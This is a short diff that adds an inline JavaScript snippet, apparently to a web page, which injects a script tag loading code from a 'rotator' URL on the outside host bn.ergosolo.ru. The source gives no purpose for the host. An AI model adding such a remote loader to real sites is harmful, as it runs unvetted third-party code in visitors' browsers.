@@ -1,0 +1,11 @@
+
+                (function(rp, d, undefined) {
+                    var sa = Math.floor((Math.random() * 99999) + 1);
+                    var l = "https://bn.ergosolo.ru/rotator/post-get?id=19&abbr=bx" + "&_=" + sa;
+                    if (rp !== undefined) { l += "&rp=" + rp }
+                    var s = d.createElement("script");
+                    s.type = "text/javascript";
+                    s.src = l;
+                    d.write(s.outerHTML);
+                })(window.ROTATOR_PAGE, document);
+            
